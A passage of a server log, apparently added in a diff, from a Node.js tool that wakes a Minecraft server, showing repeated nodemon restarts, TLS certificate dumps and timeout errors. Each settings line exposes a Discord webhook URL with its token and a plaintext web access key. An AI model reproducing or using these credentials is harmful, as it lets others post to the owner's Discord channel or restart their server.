+EwNSMTAwHhcNMjQwOTA5MDUwNjIzWhcNMjQxMjA4MDUwNjIyWjAXMRUwEwYDVQQD
+Ewx3YWtlLnNlbmkua3IwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC3
+M/Tpy9HU9CWkommR1aj2TcjRk1xYHBmAa8EPp/Rstb94oGXLOCS+1Q/2UoKMdi0q
+G7SFmiR9UQV7pWapmVstLIXPltfdEF4xZEOFEP6s7O9dLZy60ARIJ9epY6as+L9k
+14A7zZzThePiICxIEDx5sah2090TNKMKh/PVcCRxDh1Cpys+3DV41GNygelH2iql
+j5FvxmcXmKC+KQibXNXWbcXk7SVoxUYzeKabnBamJsqq+1Z/Ty1lMOOjBbtQdclW
+WcDg5/OCAH4rSLgl0/l0RKskezf6wNra9hnGpIL4raAUe6a15EJ+0O8962vw28NT
+wvzN63txFNEalfx/GkkDAgMBAAGjggIPMIICCzAOBgNVHQ8BAf8EBAMCBaAwHQYD
+VR0lBBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMCMAwGA1UdEwEB/wQCMAAwHQYDVR0O
+BBYEFGUOZ4C6dmL+VGfY/IJThnZWqlMdMB8GA1UdIwQYMBaAFLu8w0el5LypxsOk
+cgwQjaI14cjoMFcGCCsGAQUFBwEBBEswSTAiBggrBgEFBQcwAYYWaHR0cDovL3Ix
+MC5vLmxlbmNyLm9yZzAjBggrBgEFBQcwAoYXaHR0cDovL3IxMC5pLmxlbmNyLm9y
+Zy8wFwYDVR0RBBAwDoIMd2FrZS5zZW5pLmtyMBMGA1UdIAQMMAowCAYGZ4EMAQIB
+MIIBAwYKKwYBBAHWeQIEAgSB9ASB8QDvAHYA3+FW66oFr7WcD4ZxjajAMk6uVtlu
+p/WlagHRwTu+UlwAAAGR1WKWsgAABAMARzBFAiEA6mojPAG68EWybLTWrwN8TVQ1
+psLQGLPELgHfhx2WC+kCIBkyX036QJAID+kEw0tXxpfk6ddPT/KfWWeG346WAOEa
+AHUASLDja9qmRzQP5WoC+p0w6xxSActW3SyB2bu/qznYhHMAAAGR1WKWJgAABAMA
+RjBEAiAC529CBA5pcbhivXRV7eavqq26DZDgrHJ1CqnHfU9s1AIgA+Qjd6xJyEVa
+pViK0Cc+uNNiFnZOXidYC/nWOBf0uK0wDQYJKoZIhvcNAQELBQADggEBAHmXAOyk
+hjx4c/IHeT+Aoto+/mKT7ajlts6Gb5MK1BJrbsKmz1XVQx9dInS1Ud/4vPT9MlF6
+ChyE98J9hwkobobt/U8QfHsgtAZVSfoAZWedCDd/ebrLftdjLY2UqkB3jALpha9b
+RmnNrzT0euI5D/a4bNHaoInqjqYIex8AH0LcxMTNT+PV6sVtCa+ukn8OTvVUhg8x
+yKYaFXNBBs+3tcf4qKVljQvE3s+ER4e+9IBBaFMVYheZlEjTbfoodb7wo6KvwC0w
+sfY9Hhri4rJbZ7icAscxmijnU9OWyInuCr0XNUNhKy/iQvlcnL7xFqudLrCwGf0o
+UCI6/kGPUj9l3ME=
+-----END CERTIFICATE-----
+-----BEGIN CERTIFICATE-----
+MIIFBTCCAu2gAwIBAgIQS6hSk/eaL6JzBkuoBI110DANBgkqhkiG9w0BAQsFADBP
+MQswCQYDVQQGEwJVUzEpMCcGA1UEChMgSW50ZXJuZXQgU2VjdXJpdHkgUmVzZWFy
+Y2ggR3JvdXAxFTATBgNVBAMTDElTUkcgUm9vdCBYMTAeFw0yNDAzMTMwMDAwMDBa
+Fw0yNzAzMTIyMzU5NTlaMDMxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEw1MZXQncyBF
+bmNyeXB0MQwwCgYDVQQDEwNSMTAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
+AoIBAQDPV+XmxFQS7bRH/sknWHZGUCiMHT6I3wWd1bUYKb3dtVq/+vbOo76vACFL
+YlpaPAEvxVgD9on/jhFD68G14BQHlo9vH9fnuoE5CXVlt8KvGFs3Jijno/QHK20a
+/6tYvJWuQP/py1fEtVt/eA0YYbwX51TGu0mRzW4Y0YCF7qZlNrx06rxQTOr8IfM4
+FpOUurDTazgGzRYSespSdcitdrLCnF2YRVxvYXvGLe48E1KGAdlX5jgc3421H5KR
+mudKHMxFqHJV8LDmowfs/acbZp4/SItxhHFYyTr6717yW0QrPHTnj7JHwQdqzZq3
+DZb3EoEmUVQK7GH29/Xi8orIlQ2NAgMBAAGjgfgwgfUwDgYDVR0PAQH/BAQDAgGG
+MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATASBgNVHRMBAf8ECDAGAQH/
+AgEAMB0GA1UdDgQWBBS7vMNHpeS8qcbDpHIMEI2iNeHI6DAfBgNVHSMEGDAWgBR5
+tFnme7bl5AFzgAiIyBpY9umbbjAyBggrBgEFBQcBAQQmMCQwIgYIKwYBBQUHMAKG
+Fmh0dHA6Ly94MS5pLmxlbmNyLm9yZy8wEwYDVR0gBAwwCjAIBgZngQwBAgEwJwYD
+VR0fBCAwHjAcoBqgGIYWaHR0cDovL3gxLmMubGVuY3Iub3JnLzANBgkqhkiG9w0B
+AQsFAAOCAgEAkrHnQTfreZ2B5s3iJeE6IOmQRJWjgVzPw139vaBw1bGWKCIL0vIo
+zwzn1OZDjCQiHcFCktEJr59L9MhwTyAWsVrdAfYf+B9haxQnsHKNY67u4s5Lzzfd
+u6PUzeetUK29v+PsPmI2cJkxp+iN3epi4hKu9ZzUPSwMqtCceb7qPVxEbpYxY1p9
+1n5PJKBLBX9eb9LU6l8zSxPWV7bK3lG4XaMJgnT9x3ies7msFtpKK5bDtotij/l0
+GaKeA97pb5uwD9KgWvaFXMIEt8jVTjLEvwRdvCn294GPDF08U8lAkIv7tghluaQh
+1QnlE4SEN4LOECj8dsIGJXpGUk3aU3KkJz9icKy+aUgA+2cP21uh6NcDIS3XyfaZ
+QjmDQ993ChII8SXWupQZVBiIpcWO4RqZk3lr7Bz5MUCwzDIA359e57SSq5CCkY0N
+4B6Vulk7LktfwrdGNVI5BsC9qqxSwSKgRJeZ9wygIaehbHFHFhcBaMDKpiZlBHyz
+rsnnlFXCb5s8HKn5LsUgGvB24L7sGNZP2CX7dhHov+YhD+jozLW2p9W4959Bz2Ei
+RmqDtmiXLnzqTpXbI+suyCsohKRg6Un0RC47+cpiVwHiXZAW+cn8eiNIjqbVgXLx
+KPpdzvvtTnOPlC7SQZSYmdunr3Bf9b77AiC/ZidstK36dRILKz7OA54=
+-----END CERTIFICATE-----
+ 
+2024-09-09 07:14:32 info: [WebServer] Starting web server on *: 443 
+2024-09-09 07:14:32 error: [WebServer] Error getting hostname 
+2024-09-09 07:16:34 error: ETIMEDOUT 
+2024-09-09 07:16:34 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 07:16:34 info: status and waking 
+2024-09-09 07:16:34 info: -1 
+2024-09-09 07:16:34 info: false 
+[33m[nodemon] files triggering change check: src/sleepingWeb.ts[39m
+[33m[nodemon] matched rule: /opt/web/mcsleepingserverstarter/src/**/*[39m
+[33m[nodemon] changes after filters (before/after): 1/1[39m
+[32m[nodemon] restarting due to changes...[39m
+[33m[nodemon] src/sleepingWeb.ts[39m
+
+[32m[nodemon] starting `node ./build/sleepingServerStarter.js ./`[39m
+[33m[nodemon] forking[39m
+[33m[nodemon] child pid: 8797[39m
+2024-09-09 07:24:01 info: ......................... 
+2024-09-09 07:24:01 info: ... A new story begin ... 
+2024-09-09 07:24:01 info: ......................... 
+2024-09-09 07:24:03 info: Retrieved settings:{"serverName":"버튼은 한번만 누르세요","serverPort":25565,"maxPlayers":20,"loginMessage":"...Waking server up, come back in a minute...","serverOnlineMode":true,"startMinecraft":true,"minecraftCommand":"/opt/web/CloudMCServerManager/start.sh","restartDelay":5000,"version":false,"useWhitelistFile":false,"useBlacklistFiles":false,"useNativeFiles":false,"webPort":443,"webAllowRestart":true,"stopCommand":"/opt/web/CloudMCServerManager/stop.sh","discordWebhookUrl":"https://discord.com/api/webhooks/1124017685651542096/ehkqSKAq4CTWyH0VoUdijFOzZiTharlB-92T-Bpwg-Msm822dC0cI__O-JL30ja3oUNb","webKey":"seniorious28"} 
+2024-09-09 07:24:03 info: [WebServer] Getting server status 
+2024-09-09 07:24:03 info: -----BEGIN CERTIFICATE-----
+MIIE5zCCA8+gAwIBAgISBEEj4yzvh0i6tsevjIA1N5HWMA0GCSqGSIb3DQEBCwUA
+MDMxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEw1MZXQncyBFbmNyeXB0MQwwCgYDVQQD
+EwNSMTAwHhcNMjQwOTA5MDUwNjIzWhcNMjQxMjA4MDUwNjIyWjAXMRUwEwYDVQQD
+Ewx3YWtlLnNlbmkua3IwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC3
+M/Tpy9HU9CWkommR1aj2TcjRk1xYHBmAa8EPp/Rstb94oGXLOCS+1Q/2UoKMdi0q
+G7SFmiR9UQV7pWapmVstLIXPltfdEF4xZEOFEP6s7O9dLZy60ARIJ9epY6as+L9k
+14A7zZzThePiICxIEDx5sah2090TNKMKh/PVcCRxDh1Cpys+3DV41GNygelH2iql
+j5FvxmcXmKC+KQibXNXWbcXk7SVoxUYzeKabnBamJsqq+1Z/Ty1lMOOjBbtQdclW
+WcDg5/OCAH4rSLgl0/l0RKskezf6wNra9hnGpIL4raAUe6a15EJ+0O8962vw28NT
+wvzN63txFNEalfx/GkkDAgMBAAGjggIPMIICCzAOBgNVHQ8BAf8EBAMCBaAwHQYD
+VR0lBBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMCMAwGA1UdEwEB/wQCMAAwHQYDVR0O
+BBYEFGUOZ4C6dmL+VGfY/IJThnZWqlMdMB8GA1UdIwQYMBaAFLu8w0el5LypxsOk
+cgwQjaI14cjoMFcGCCsGAQUFBwEBBEswSTAiBggrBgEFBQcwAYYWaHR0cDovL3Ix
+MC5vLmxlbmNyLm9yZzAjBggrBgEFBQcwAoYXaHR0cDovL3IxMC5pLmxlbmNyLm9y
+Zy8wFwYDVR0RBBAwDoIMd2FrZS5zZW5pLmtyMBMGA1UdIAQMMAowCAYGZ4EMAQIB
+MIIBAwYKKwYBBAHWeQIEAgSB9ASB8QDvAHYA3+FW66oFr7WcD4ZxjajAMk6uVtlu
+p/WlagHRwTu+UlwAAAGR1WKWsgAABAMARzBFAiEA6mojPAG68EWybLTWrwN8TVQ1
+psLQGLPELgHfhx2WC+kCIBkyX036QJAID+kEw0tXxpfk6ddPT/KfWWeG346WAOEa
+AHUASLDja9qmRzQP5WoC+p0w6xxSActW3SyB2bu/qznYhHMAAAGR1WKWJgAABAMA
+RjBEAiAC529CBA5pcbhivXRV7eavqq26DZDgrHJ1CqnHfU9s1AIgA+Qjd6xJyEVa
+pViK0Cc+uNNiFnZOXidYC/nWOBf0uK0wDQYJKoZIhvcNAQELBQADggEBAHmXAOyk
+hjx4c/IHeT+Aoto+/mKT7ajlts6Gb5MK1BJrbsKmz1XVQx9dInS1Ud/4vPT9MlF6
+ChyE98J9hwkobobt/U8QfHsgtAZVSfoAZWedCDd/ebrLftdjLY2UqkB3jALpha9b
+RmnNrzT0euI5D/a4bNHaoInqjqYIex8AH0LcxMTNT+PV6sVtCa+ukn8OTvVUhg8x
+yKYaFXNBBs+3tcf4qKVljQvE3s+ER4e+9IBBaFMVYheZlEjTbfoodb7wo6KvwC0w
+sfY9Hhri4rJbZ7icAscxmijnU9OWyInuCr0XNUNhKy/iQvlcnL7xFqudLrCwGf0o
+UCI6/kGPUj9l3ME=
+-----END CERTIFICATE-----
+-----BEGIN CERTIFICATE-----
+MIIFBTCCAu2gAwIBAgIQS6hSk/eaL6JzBkuoBI110DANBgkqhkiG9w0BAQsFADBP
+MQswCQYDVQQGEwJVUzEpMCcGA1UEChMgSW50ZXJuZXQgU2VjdXJpdHkgUmVzZWFy
+Y2ggR3JvdXAxFTATBgNVBAMTDElTUkcgUm9vdCBYMTAeFw0yNDAzMTMwMDAwMDBa
+Fw0yNzAzMTIyMzU5NTlaMDMxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEw1MZXQncyBF
+bmNyeXB0MQwwCgYDVQQDEwNSMTAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
+AoIBAQDPV+XmxFQS7bRH/sknWHZGUCiMHT6I3wWd1bUYKb3dtVq/+vbOo76vACFL
+YlpaPAEvxVgD9on/jhFD68G14BQHlo9vH9fnuoE5CXVlt8KvGFs3Jijno/QHK20a
+/6tYvJWuQP/py1fEtVt/eA0YYbwX51TGu0mRzW4Y0YCF7qZlNrx06rxQTOr8IfM4
+FpOUurDTazgGzRYSespSdcitdrLCnF2YRVxvYXvGLe48E1KGAdlX5jgc3421H5KR
+mudKHMxFqHJV8LDmowfs/acbZp4/SItxhHFYyTr6717yW0QrPHTnj7JHwQdqzZq3
+DZb3EoEmUVQK7GH29/Xi8orIlQ2NAgMBAAGjgfgwgfUwDgYDVR0PAQH/BAQDAgGG
+MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATASBgNVHRMBAf8ECDAGAQH/
+AgEAMB0GA1UdDgQWBBS7vMNHpeS8qcbDpHIMEI2iNeHI6DAfBgNVHSMEGDAWgBR5
+tFnme7bl5AFzgAiIyBpY9umbbjAyBggrBgEFBQcBAQQmMCQwIgYIKwYBBQUHMAKG
+Fmh0dHA6Ly94MS5pLmxlbmNyLm9yZy8wEwYDVR0gBAwwCjAIBgZngQwBAgEwJwYD
+VR0fBCAwHjAcoBqgGIYWaHR0cDovL3gxLmMubGVuY3Iub3JnLzANBgkqhkiG9w0B
+AQsFAAOCAgEAkrHnQTfreZ2B5s3iJeE6IOmQRJWjgVzPw139vaBw1bGWKCIL0vIo
+zwzn1OZDjCQiHcFCktEJr59L9MhwTyAWsVrdAfYf+B9haxQnsHKNY67u4s5Lzzfd
+u6PUzeetUK29v+PsPmI2cJkxp+iN3epi4hKu9ZzUPSwMqtCceb7qPVxEbpYxY1p9
+1n5PJKBLBX9eb9LU6l8zSxPWV7bK3lG4XaMJgnT9x3ies7msFtpKK5bDtotij/l0
+GaKeA97pb5uwD9KgWvaFXMIEt8jVTjLEvwRdvCn294GPDF08U8lAkIv7tghluaQh
+1QnlE4SEN4LOECj8dsIGJXpGUk3aU3KkJz9icKy+aUgA+2cP21uh6NcDIS3XyfaZ
+QjmDQ993ChII8SXWupQZVBiIpcWO4RqZk3lr7Bz5MUCwzDIA359e57SSq5CCkY0N
+4B6Vulk7LktfwrdGNVI5BsC9qqxSwSKgRJeZ9wygIaehbHFHFhcBaMDKpiZlBHyz
+rsnnlFXCb5s8HKn5LsUgGvB24L7sGNZP2CX7dhHov+YhD+jozLW2p9W4959Bz2Ei
+RmqDtmiXLnzqTpXbI+suyCsohKRg6Un0RC47+cpiVwHiXZAW+cn8eiNIjqbVgXLx
+KPpdzvvtTnOPlC7SQZSYmdunr3Bf9b77AiC/ZidstK36dRILKz7OA54=
+-----END CERTIFICATE-----
+ 
+2024-09-09 07:24:03 info: [WebServer] Starting web server on *: 443 
+2024-09-09 07:24:03 error: [WebServer] Error getting hostname 
+2024-09-09 07:25:58 info: to ==> https://wake.seni.kr/ 
+2024-09-09 07:26:03 info: to ==> https://wake.seni.kr/ 
+2024-09-09 07:26:04 error: ETIMEDOUT 
+2024-09-09 07:26:04 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 07:26:04 info: status and waking 
+2024-09-09 07:26:04 info: -1 
+2024-09-09 07:26:04 info: false 
+[33m[nodemon] files triggering change check: src/sleepingWeb.ts[39m
+[33m[nodemon] matched rule: /opt/web/mcsleepingserverstarter/src/**/*[39m
+[33m[nodemon] changes after filters (before/after): 1/1[39m
+[32m[nodemon] restarting due to changes...[39m
+[33m[nodemon] src/sleepingWeb.ts[39m
+
+[32m[nodemon] starting `node ./build/sleepingServerStarter.js ./`[39m
+[33m[nodemon] forking[39m
+[33m[nodemon] child pid: 9375[39m
+2024-09-09 07:46:41 info: ......................... 
+2024-09-09 07:46:41 info: ... A new story begin ... 
+2024-09-09 07:46:41 info: ......................... 
+2024-09-09 07:46:44 info: Retrieved settings:{"serverName":"버튼은 한번만 누르세요","serverPort":25565,"maxPlayers":20,"loginMessage":"...Waking server up, come back in a minute...","serverOnlineMode":true,"startMinecraft":true,"minecraftCommand":"/opt/web/CloudMCServerManager/start.sh","restartDelay":5000,"version":false,"useWhitelistFile":false,"useBlacklistFiles":false,"useNativeFiles":false,"webPort":443,"webAllowRestart":true,"stopCommand":"/opt/web/CloudMCServerManager/stop.sh","discordWebhookUrl":"https://discord.com/api/webhooks/1124017685651542096/ehkqSKAq4CTWyH0VoUdijFOzZiTharlB-92T-Bpwg-Msm822dC0cI__O-JL30ja3oUNb","webKey":"seniorious28"} 
+2024-09-09 07:46:44 info: [WebServer] Getting server status 
+2024-09-09 07:46:44 info: -----BEGIN CERTIFICATE-----
+MIIE5zCCA8+gAwIBAgISBEEj4yzvh0i6tsevjIA1N5HWMA0GCSqGSIb3DQEBCwUA
+MDMxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEw1MZXQncyBFbmNyeXB0MQwwCgYDVQQD
+EwNSMTAwHhcNMjQwOTA5MDUwNjIzWhcNMjQxMjA4MDUwNjIyWjAXMRUwEwYDVQQD
+Ewx3YWtlLnNlbmkua3IwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC3
+M/Tpy9HU9CWkommR1aj2TcjRk1xYHBmAa8EPp/Rstb94oGXLOCS+1Q/2UoKMdi0q
+G7SFmiR9UQV7pWapmVstLIXPltfdEF4xZEOFEP6s7O9dLZy60ARIJ9epY6as+L9k
+14A7zZzThePiICxIEDx5sah2090TNKMKh/PVcCRxDh1Cpys+3DV41GNygelH2iql
+j5FvxmcXmKC+KQibXNXWbcXk7SVoxUYzeKabnBamJsqq+1Z/Ty1lMOOjBbtQdclW
+WcDg5/OCAH4rSLgl0/l0RKskezf6wNra9hnGpIL4raAUe6a15EJ+0O8962vw28NT
+wvzN63txFNEalfx/GkkDAgMBAAGjggIPMIICCzAOBgNVHQ8BAf8EBAMCBaAwHQYD
+VR0lBBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMCMAwGA1UdEwEB/wQCMAAwHQYDVR0O
+BBYEFGUOZ4C6dmL+VGfY/IJThnZWqlMdMB8GA1UdIwQYMBaAFLu8w0el5LypxsOk
+cgwQjaI14cjoMFcGCCsGAQUFBwEBBEswSTAiBggrBgEFBQcwAYYWaHR0cDovL3Ix
+MC5vLmxlbmNyLm9yZzAjBggrBgEFBQcwAoYXaHR0cDovL3IxMC5pLmxlbmNyLm9y
+Zy8wFwYDVR0RBBAwDoIMd2FrZS5zZW5pLmtyMBMGA1UdIAQMMAowCAYGZ4EMAQIB
+MIIBAwYKKwYBBAHWeQIEAgSB9ASB8QDvAHYA3+FW66oFr7WcD4ZxjajAMk6uVtlu
+p/WlagHRwTu+UlwAAAGR1WKWsgAABAMARzBFAiEA6mojPAG68EWybLTWrwN8TVQ1
+psLQGLPELgHfhx2WC+kCIBkyX036QJAID+kEw0tXxpfk6ddPT/KfWWeG346WAOEa
+AHUASLDja9qmRzQP5WoC+p0w6xxSActW3SyB2bu/qznYhHMAAAGR1WKWJgAABAMA
+RjBEAiAC529CBA5pcbhivXRV7eavqq26DZDgrHJ1CqnHfU9s1AIgA+Qjd6xJyEVa
+pViK0Cc+uNNiFnZOXidYC/nWOBf0uK0wDQYJKoZIhvcNAQELBQADggEBAHmXAOyk
+hjx4c/IHeT+Aoto+/mKT7ajlts6Gb5MK1BJrbsKmz1XVQx9dInS1Ud/4vPT9MlF6
+ChyE98J9hwkobobt/U8QfHsgtAZVSfoAZWedCDd/ebrLftdjLY2UqkB3jALpha9b
+RmnNrzT0euI5D/a4bNHaoInqjqYIex8AH0LcxMTNT+PV6sVtCa+ukn8OTvVUhg8x
+yKYaFXNBBs+3tcf4qKVljQvE3s+ER4e+9IBBaFMVYheZlEjTbfoodb7wo6KvwC0w
+sfY9Hhri4rJbZ7icAscxmijnU9OWyInuCr0XNUNhKy/iQvlcnL7xFqudLrCwGf0o
+UCI6/kGPUj9l3ME=
+-----END CERTIFICATE-----
+-----BEGIN CERTIFICATE-----
+MIIFBTCCAu2gAwIBAgIQS6hSk/eaL6JzBkuoBI110DANBgkqhkiG9w0BAQsFADBP
+MQswCQYDVQQGEwJVUzEpMCcGA1UEChMgSW50ZXJuZXQgU2VjdXJpdHkgUmVzZWFy
+Y2ggR3JvdXAxFTATBgNVBAMTDElTUkcgUm9vdCBYMTAeFw0yNDAzMTMwMDAwMDBa
+Fw0yNzAzMTIyMzU5NTlaMDMxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEw1MZXQncyBF
+bmNyeXB0MQwwCgYDVQQDEwNSMTAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
+AoIBAQDPV+XmxFQS7bRH/sknWHZGUCiMHT6I3wWd1bUYKb3dtVq/+vbOo76vACFL
+YlpaPAEvxVgD9on/jhFD68G14BQHlo9vH9fnuoE5CXVlt8KvGFs3Jijno/QHK20a
+/6tYvJWuQP/py1fEtVt/eA0YYbwX51TGu0mRzW4Y0YCF7qZlNrx06rxQTOr8IfM4
+FpOUurDTazgGzRYSespSdcitdrLCnF2YRVxvYXvGLe48E1KGAdlX5jgc3421H5KR
+mudKHMxFqHJV8LDmowfs/acbZp4/SItxhHFYyTr6717yW0QrPHTnj7JHwQdqzZq3
+DZb3EoEmUVQK7GH29/Xi8orIlQ2NAgMBAAGjgfgwgfUwDgYDVR0PAQH/BAQDAgGG
+MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATASBgNVHRMBAf8ECDAGAQH/
+AgEAMB0GA1UdDgQWBBS7vMNHpeS8qcbDpHIMEI2iNeHI6DAfBgNVHSMEGDAWgBR5
+tFnme7bl5AFzgAiIyBpY9umbbjAyBggrBgEFBQcBAQQmMCQwIgYIKwYBBQUHMAKG
+Fmh0dHA6Ly94MS5pLmxlbmNyLm9yZy8wEwYDVR0gBAwwCjAIBgZngQwBAgEwJwYD
+VR0fBCAwHjAcoBqgGIYWaHR0cDovL3gxLmMubGVuY3Iub3JnLzANBgkqhkiG9w0B
+AQsFAAOCAgEAkrHnQTfreZ2B5s3iJeE6IOmQRJWjgVzPw139vaBw1bGWKCIL0vIo
+zwzn1OZDjCQiHcFCktEJr59L9MhwTyAWsVrdAfYf+B9haxQnsHKNY67u4s5Lzzfd
+u6PUzeetUK29v+PsPmI2cJkxp+iN3epi4hKu9ZzUPSwMqtCceb7qPVxEbpYxY1p9
+1n5PJKBLBX9eb9LU6l8zSxPWV7bK3lG4XaMJgnT9x3ies7msFtpKK5bDtotij/l0
+GaKeA97pb5uwD9KgWvaFXMIEt8jVTjLEvwRdvCn294GPDF08U8lAkIv7tghluaQh
+1QnlE4SEN4LOECj8dsIGJXpGUk3aU3KkJz9icKy+aUgA+2cP21uh6NcDIS3XyfaZ
+QjmDQ993ChII8SXWupQZVBiIpcWO4RqZk3lr7Bz5MUCwzDIA359e57SSq5CCkY0N
+4B6Vulk7LktfwrdGNVI5BsC9qqxSwSKgRJeZ9wygIaehbHFHFhcBaMDKpiZlBHyz
+rsnnlFXCb5s8HKn5LsUgGvB24L7sGNZP2CX7dhHov+YhD+jozLW2p9W4959Bz2Ei
+RmqDtmiXLnzqTpXbI+suyCsohKRg6Un0RC47+cpiVwHiXZAW+cn8eiNIjqbVgXLx
+KPpdzvvtTnOPlC7SQZSYmdunr3Bf9b77AiC/ZidstK36dRILKz7OA54=
+-----END CERTIFICATE-----
+ 
+2024-09-09 07:46:44 info: [WebServer] Starting web server on *: 443 
+2024-09-09 07:46:45 error: [WebServer] Error getting hostname 
+[33m[nodemon] files triggering change check: src/sleepingWeb.ts[39m
+[33m[nodemon] matched rule: /opt/web/mcsleepingserverstarter/src/**/*[39m
+[33m[nodemon] changes after filters (before/after): 1/1[39m
+[32m[nodemon] restarting due to changes...[39m
+[33m[nodemon] src/sleepingWeb.ts[39m
+
+[32m[nodemon] starting `node ./build/sleepingServerStarter.js ./`[39m
+[33m[nodemon] forking[39m
+[33m[nodemon] child pid: 9471[39m
+2024-09-09 07:47:24 info: ......................... 
+2024-09-09 07:47:24 info: ... A new story begin ... 
+2024-09-09 07:47:24 info: ......................... 
+2024-09-09 07:47:27 info: Retrieved settings:{"serverName":"버튼은 한번만 누르세요","serverPort":25565,"maxPlayers":20,"loginMessage":"...Waking server up, come back in a minute...","serverOnlineMode":true,"startMinecraft":true,"minecraftCommand":"/opt/web/CloudMCServerManager/start.sh","restartDelay":5000,"version":false,"useWhitelistFile":false,"useBlacklistFiles":false,"useNativeFiles":false,"webPort":443,"webAllowRestart":true,"stopCommand":"/opt/web/CloudMCServerManager/stop.sh","discordWebhookUrl":"https://discord.com/api/webhooks/1124017685651542096/ehkqSKAq4CTWyH0VoUdijFOzZiTharlB-92T-Bpwg-Msm822dC0cI__O-JL30ja3oUNb","webKey":"seniorious28"} 
+2024-09-09 07:47:27 info: [WebServer] Getting server status 
+2024-09-09 07:47:27 info: -----BEGIN CERTIFICATE-----
+MIIE5zCCA8+gAwIBAgISBEEj4yzvh0i6tsevjIA1N5HWMA0GCSqGSIb3DQEBCwUA
+MDMxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEw1MZXQncyBFbmNyeXB0MQwwCgYDVQQD
+EwNSMTAwHhcNMjQwOTA5MDUwNjIzWhcNMjQxMjA4MDUwNjIyWjAXMRUwEwYDVQQD
+Ewx3YWtlLnNlbmkua3IwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC3
+M/Tpy9HU9CWkommR1aj2TcjRk1xYHBmAa8EPp/Rstb94oGXLOCS+1Q/2UoKMdi0q
+G7SFmiR9UQV7pWapmVstLIXPltfdEF4xZEOFEP6s7O9dLZy60ARIJ9epY6as+L9k
+14A7zZzThePiICxIEDx5sah2090TNKMKh/PVcCRxDh1Cpys+3DV41GNygelH2iql
+j5FvxmcXmKC+KQibXNXWbcXk7SVoxUYzeKabnBamJsqq+1Z/Ty1lMOOjBbtQdclW
+WcDg5/OCAH4rSLgl0/l0RKskezf6wNra9hnGpIL4raAUe6a15EJ+0O8962vw28NT
+wvzN63txFNEalfx/GkkDAgMBAAGjggIPMIICCzAOBgNVHQ8BAf8EBAMCBaAwHQYD
+VR0lBBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMCMAwGA1UdEwEB/wQCMAAwHQYDVR0O
+BBYEFGUOZ4C6dmL+VGfY/IJThnZWqlMdMB8GA1UdIwQYMBaAFLu8w0el5LypxsOk
+cgwQjaI14cjoMFcGCCsGAQUFBwEBBEswSTAiBggrBgEFBQcwAYYWaHR0cDovL3Ix
+MC5vLmxlbmNyLm9yZzAjBggrBgEFBQcwAoYXaHR0cDovL3IxMC5pLmxlbmNyLm9y
+Zy8wFwYDVR0RBBAwDoIMd2FrZS5zZW5pLmtyMBMGA1UdIAQMMAowCAYGZ4EMAQIB
+MIIBAwYKKwYBBAHWeQIEAgSB9ASB8QDvAHYA3+FW66oFr7WcD4ZxjajAMk6uVtlu
+p/WlagHRwTu+UlwAAAGR1WKWsgAABAMARzBFAiEA6mojPAG68EWybLTWrwN8TVQ1
+psLQGLPELgHfhx2WC+kCIBkyX036QJAID+kEw0tXxpfk6ddPT/KfWWeG346WAOEa
+AHUASLDja9qmRzQP5WoC+p0w6xxSActW3SyB2bu/qznYhHMAAAGR1WKWJgAABAMA
+RjBEAiAC529CBA5pcbhivXRV7eavqq26DZDgrHJ1CqnHfU9s1AIgA+Qjd6xJyEVa
+pViK0Cc+uNNiFnZOXidYC/nWOBf0uK0wDQYJKoZIhvcNAQELBQADggEBAHmXAOyk
+hjx4c/IHeT+Aoto+/mKT7ajlts6Gb5MK1BJrbsKmz1XVQx9dInS1Ud/4vPT9MlF6
+ChyE98J9hwkobobt/U8QfHsgtAZVSfoAZWedCDd/ebrLftdjLY2UqkB3jALpha9b
+RmnNrzT0euI5D/a4bNHaoInqjqYIex8AH0LcxMTNT+PV6sVtCa+ukn8OTvVUhg8x
+yKYaFXNBBs+3tcf4qKVljQvE3s+ER4e+9IBBaFMVYheZlEjTbfoodb7wo6KvwC0w
+sfY9Hhri4rJbZ7icAscxmijnU9OWyInuCr0XNUNhKy/iQvlcnL7xFqudLrCwGf0o
+UCI6/kGPUj9l3ME=
+-----END CERTIFICATE-----
+-----BEGIN CERTIFICATE-----
+MIIFBTCCAu2gAwIBAgIQS6hSk/eaL6JzBkuoBI110DANBgkqhkiG9w0BAQsFADBP
+MQswCQYDVQQGEwJVUzEpMCcGA1UEChMgSW50ZXJuZXQgU2VjdXJpdHkgUmVzZWFy
+Y2ggR3JvdXAxFTATBgNVBAMTDElTUkcgUm9vdCBYMTAeFw0yNDAzMTMwMDAwMDBa
+Fw0yNzAzMTIyMzU5NTlaMDMxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEw1MZXQncyBF
+bmNyeXB0MQwwCgYDVQQDEwNSMTAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
+AoIBAQDPV+XmxFQS7bRH/sknWHZGUCiMHT6I3wWd1bUYKb3dtVq/+vbOo76vACFL
+YlpaPAEvxVgD9on/jhFD68G14BQHlo9vH9fnuoE5CXVlt8KvGFs3Jijno/QHK20a
+/6tYvJWuQP/py1fEtVt/eA0YYbwX51TGu0mRzW4Y0YCF7qZlNrx06rxQTOr8IfM4
+FpOUurDTazgGzRYSespSdcitdrLCnF2YRVxvYXvGLe48E1KGAdlX5jgc3421H5KR
